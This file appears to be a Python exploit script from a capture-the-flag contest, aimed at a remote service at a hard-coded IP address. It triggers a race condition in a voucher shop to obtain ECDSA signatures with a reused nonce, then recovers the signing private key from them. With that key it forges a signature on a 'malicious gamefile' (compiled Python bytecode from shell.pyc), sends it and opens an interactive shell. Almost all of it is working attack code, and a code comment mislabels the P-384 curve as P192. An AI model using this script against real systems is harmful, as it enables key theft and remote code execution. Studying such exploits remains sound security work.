from pwn import *
from hashlib import *

REMOTE = True

# Prime field of definition
p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000ffffffff

# Order of base point
n = 0xffffffffffffffffffffffffffffffffffffffffffffffffc7634d81f4372ddf581a0db248b0a77aecec196accc52973

# Short Weierstrass: y^3 = x^3 + a x + b
b = 0xb3312fa7e23ee7e4988e056be3f82d19181d9c6efe8141120314088f5013875ac656398d8a2ed19d2a85c8edd3ec2aef
a = -3

# Base point
G = (
    0xaa87ca22be8b05378eb1c71ef320ad746e1d3b628ba79b9859f741e082542a385502f25dbf55296c3a545e3872760ab7,
    0x3617de4a96262c6f5d9e98bf9292dc29f8f41dbd289a147ce9da3113b5f0b8c00a60b1ce1d7e819d7a431d7c90ea0e5f
)

# NIST P192 curve
E = EllipticCurve(
    GF(p),
    [0, 0, 0, a, b]
)

# G should be on the curve (sanity check)
G = E(G)

# we operate in the scalar field over the module generated by G on E
F = GF(n)

ip = '165.22.90.215'

def hash(m):
    return F(int(sha384(m).hexdigest(), 16))

def conn_shop():
    if REMOTE:
        return remote(ip, 705)
    return None

def conn_gamebox():
    if REMOTE:
        return remote(ip, 706)
    return None

def shop():
    c = conn_shop()
    return c

SERIALIZED_SIZE = 96

def get_vouchers(amount):
    vouchers = []
    c = conn_shop()
    c.recvuntil('#### Main Menu ####')
    for _ in range(amount):
        c.sendline('1')
        c.sendline('y')
    for _ in range(amount):
        c.recvuntil('Here is your free voucher:\n\n')
        vouchers.append(parse_voucher(c.recvline()))
    c.close()
    return  vouchers

def parse_sig(sig):
    assert len(sig) == SERIALIZED_SIZE
    assert len(sig) % 2 == 0
    r = int(sig[:SERIALIZED_SIZE / 2].encode('hex'), 16)
    s = int(sig[SERIALIZED_SIZE / 2:].encode('hex'), 16)
    return (F(s), F(r))

def parse_voucher(v):
    m, sig = v.strip().split('-')
    m = m.decode('hex')
    sig = sig.decode('hex')
    s, r = parse_sig(sig)
    return (m, s, r)

try:
    m1, s1, r1 = pickle.loads(read('sig1.tmp'))
    m2, s2, r2 = pickle.loads(read('sig2.tmp'))

except IOError:

    from multiprocessing import Pool

    def race(N = 8, W = 4):

        pool = Pool(W)

        while 1:

            print 'Spam the server (race condition)'

            res = []

            for r in pool.map(get_vouchers, [N] * W):
                res += r

            print 'Check for matches (%d)' % len(res)

            for (h1, s1, r1) in res:
                for (h2, s2, r2) in res:
                    if r1 == r2 and h1 != h2:
                        return (h1, s1, r1), (h2, s2, r2)

    (m1, s1, r1), (m2, s2, r2) = race()

    write('sig1.tmp', pickle.dumps((m1, s1, r1)))
    write('sig2.tmp', pickle.dumps((m2, s2, r2)))

z1 = hash(m1)
z2 = hash(m2)

assert r1 == r2
assert z1 != z2
assert s1 != s2

print 'Nonce reuse found:'

print 'z1:', hex(int(z1))
print 's1:', hex(int(s1))
print 'r1:', hex(int(r1))

print
print 'z2:', hex(int(z2))
print 's2:', hex(int(s2))
print 'r2:', hex(int(r2))

z1 = F(z1)
z2 = F(z2)

s1 = F(s1)
s2 = F(s2)

r1 = F(r1)
r2 = F(r2)

k = (z1 - z2) / (s1 - s2)
sk1 = (s1 * k - z1) / r1
sk2 = (s2 * k - z2) / r2

assert sk1 == sk2

sk = sk1
pk = int(sk1) * G

print
print 'k :', hex(int(k))
print 'sk:', hex(int(sk1))

x, y = pk.xy()
print 'pk-x:', hex(int(x))
print 'pk-y:', hex(int(y))
print

# sanity check (verify signature)

def verify(z, s, r, pk):
    u1 = z / s
    u2 = r / s
    tp = int(u1) * G + int(u2) * pk
    x1 = tp.xy()[0]
    return F(x1) == F(r)

game = 'kvvwtcqDEzEeXmEr5eHJDw9Cqs27u0LxYzSrgHgXdYno/LXwoCS44QoC0AAjFqEhEKqrWj6pBbKQpdwe92sLrTzUUATcqIENxM5EJ4W5MrfdheH2bcBL8XufTtPhFulo4wAAAAAAAAAAAAAAAAQAAABAAAAAcxIAAABlAKABZQKgA6EAoQEBAGQAUwApAU4pBFoLc3Rkb3V0X2ZpbGXaBXdyaXRlWgpzdGRpbl9maWxl2ghyZWFkbGluZakAcgMAAAByAwAAAPoHZWNoby5wedoIPG1vZHVsZT4BAAAA8wAAAAA='
game = game.decode('base64')

(s, r) = parse_sig(game[:SERIALIZED_SIZE])
z = hash(game[SERIALIZED_SIZE:])

assert verify(z, s, r, pk)
assert verify(z1, s1, r1, pk)
assert verify(z2, s2, r2, pk)

## Craft malicious gamefile ##

# load some python3 bytecode

def sign(m, sk):
    z = hash(m)
    for k in xrange(10, 1 << 32):
        x, y = (k * G).xy()
        r    = F(x)
        if not r.is_zero():
            break
    s = (z + sk * r) / k
    return s, r

code = read('shell.pyc')
s, r = sign(code, sk)

assert verify(hash(code), s, r, pk)

print 'new-r:', hex(int(r))
print 'new-s:', hex(int(s))

def pack(v):
    return (('%%%dx' % SERIALIZED_SIZE) % int(v)).decode('hex')

sig = pack(r) + pack(s)

sp, rp = parse_sig(sig)

assert sp == s
assert rp == r
assert len(sig) == SERIALIZED_SIZE

msg = (sig + code).encode('base64').replace('\n', '')

c = conn_gamebox()
c.sendline(msg)
c.interactive()
